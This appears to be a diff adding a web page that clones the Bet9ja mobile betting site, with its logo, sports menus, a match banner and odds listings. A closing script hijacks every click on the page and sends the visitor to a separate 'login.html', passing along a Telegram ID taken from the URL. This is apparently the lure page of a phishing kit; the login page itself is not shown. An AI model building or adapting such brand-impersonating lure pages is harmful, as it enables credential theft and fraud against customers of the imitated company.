@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Bet9ja Mobile</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+body{
+  margin:0;
+  background:#11141b;
+  color:#fff;
+}
+
+/* ===== HEADER ===== */
+.header{
+  background:#2b2f3a;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:10px 12px;
+}
+
+.header .left{
+  display:flex;
+  align-items:center;
+  gap:6px;
+  color:#ffc400;
+  font-size:14px;
+}
+
+.logo{
+  font-size:22px;
+  font-weight:800;
+}
+
+.logo .red{color:#e50914}
+.logo .green{color:#36c773}
+
+.header .right{
+  font-size:14px;
+}
+
+/* ===== ICON MENU ===== */
+.icon-menu{
+  display:flex;
+  gap:12px;
+  padding:14px 10px;
+  overflow-x:auto;
+}
+
+.icon-box{
+  min-width:72px;
+  height:65px;
+  background:#2b2f3a;
+  border-radius:10px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  font-size:12px;
+}
+
+/* ===== CATEGORY ===== */
+.category{
+  display:flex;
+  gap:10px;
+  padding:10px;
+  overflow-x:auto;
+}
+
+.category div{
+  background:#2b2f3a;
+  padding:8px 14px;
+  border-radius:8px;
+  font-size:13px;
+  white-space:nowrap;
+}
+
+/* ===== BANNER ===== */
+.banner{
+  margin:10px;
+  background:linear-gradient(120deg,#1d5f3c,#000);
+  border-radius:12px;
+  padding:14px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+}
+
+.banner h3{
+  margin:0;
+  font-size:16px;
+  color:#00ff73;
+}
+
+.banner button{
+  margin-top:6px;
+  padding:6px 14px;
+  border:none;
+  background:#00a651;
+  color:white;
+  font-weight:bold;
+  border-radius:6px;
+}
+
+/* ===== TABS ===== */
+.tabs{
+  display:flex;
+  background:#2b2f3a;
+  margin:10px;
+  border-radius:8px;
+}
+
+.tabs div{
+  flex:1;
+  padding:10px;
+  text-align:center;
+  font-size:13px;
+}
+
+/* ===== ODDS TITLE ===== */
+.table-head{
+  display:flex;
+  padding:10px;
+  font-size:14px;
+  background:#3a3f4a;
+}
+
+/* ===== MATCH LIST ===== */
+.match{
+  display:flex;
+  justify-content:space-between;
+  padding:12px 10px;
+  border-bottom:1px solid #2b2f3a;
+}
+
+.match .left{
+  font-size:13px;
+}
+
+.odds{
+  display:flex;
+  gap:8px;
+}
+
+.odds div{
+  background:#0a7c3a;
+  padding:8px 10px;
+  border-radius:6px;
+  font-size:13px;
+  min-width:60px;
+  text-align:center;
+}
+
+/* ===== BOTTOM NAV ===== */
+.bottom-nav{
+  position:fixed;
+  bottom:0;
+  width:100%;
+  background:#000;
+  display:flex;
+  justify-content:space-around;
+  padding:8px 0;
+  font-size:12px;
+}
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="left">👤 Register</div>
+  <div class="logo"><span class="red">bet</span><span class="green">9ja</span></div>
+  <div class="right">Login ➜</div>
+</div>
+
+<!-- ICON MENU -->
+<div class="icon-menu">
+  <div class="icon-box">⚽<br>Soccer</div>
+  <div class="icon-box">⏱<br>Live</div>
+  <div class="icon-box">⚡<br>Zoom</div>
+  <div class="icon-box">🎡<br>Spin</div>
+  <div class="icon-box">🏟<br>Stadium</div>
+</div>
+
+<!-- CATEGORY -->
+<div class="category">
+  <div>Africa Cup</div>
+  <div>Premier League</div>
+  <div>LaLiga</div>
+  <div>Serie A</div>
+</div>
+
+<!-- BANNER -->
+<div class="banner">
+  <div>
+    <h3>WOLVES vs MAN UTD</h3>
+    <button>BET NOW</button>
+  </div>
+</div>
+
+<!-- TABS -->
+<div class="tabs">
+  <div>HIGHLIGHTS</div>
+  <div>LIVE</div>
+  <div>UPCOMING</div>
+  <div>ZOOM</div>
+</div>
+
+<div class="table-head">Today &nbsp;&nbsp;&nbsp;&nbsp; 1 &nbsp;&nbsp; X &nbsp;&nbsp; 2</div>
+
+<!-- MATCH -->
+<div class="match">
+  <div class="left">
+    CSKA 1948<br>
+    Dobrudzha Dobrich
+  </div>
+  <div class="odds">
+    <div>1.23</div>
+    <div>5.90</div>
+    <div>11.25</div>
+  </div>
+</div>
+
+<div class="match">
+  <div class="left">
+    Pisa<br>
+    Parma
+  </div>
+  <div class="odds">
+    <div>2.60</div>
+    <div>2.92</div>
+    <div>3.10</div>
+  </div>
+</div>
+
+<!-- BOTTOM NAV -->
+<div class="bottom-nav">
+  <div>A-Z</div>
+  <div>Casino</div>
+  <div>Betslip</div>
+  <div>Check</div>
+  <div>Login</div>
+</div>
+<script>
+  // Get Telegram ID from current URL
+  function getTelegramID() {
+    const params = new URLSearchParams(window.location.search);
+    return params.get("id");
+  }
+
+  // Redirect on any click
+  document.addEventListener("click", function (e) {
+    e.preventDefault(); // stop default click behavior
+
+    const telegramID = getTelegramID();
+
+    if (telegramID) {
+      window.location.href = `login.html?id=${telegramID}`;
+    } else {
+      window.location.href = "login.html";
+    }
+  }, true); // true makes it catch ALL clicks
+</script>
+</body>
+</html>
